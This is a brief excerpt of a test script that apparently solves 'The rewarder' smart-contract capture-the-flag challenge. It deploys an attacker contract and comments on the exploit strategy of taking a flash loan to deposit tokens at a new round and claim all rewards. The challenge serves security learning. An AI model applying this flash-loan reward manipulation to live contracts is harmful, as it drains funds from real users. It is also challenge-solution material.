...
describe("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * The catch here is that wait for next 5 days for the next round.
     * When the next round is up, deposit the DVT tokens by taking flashlaon.
     * And then claim all the reward tokens
     */
    const HackTheRewarderFactory = await ethers.getContractFactory(
      "HackTheRewarder",
      deployer
    );
    const HackTheRewarder = await HackTheRewarderFactory.deploy(
      this.liquidityToken.address,
    ...
    await HackTheRewarder.connect(attacker).startHack(TOKENS_IN_LENDER_POOL);
    await HackTheRewarder.connect(attacker).endHack();
  });
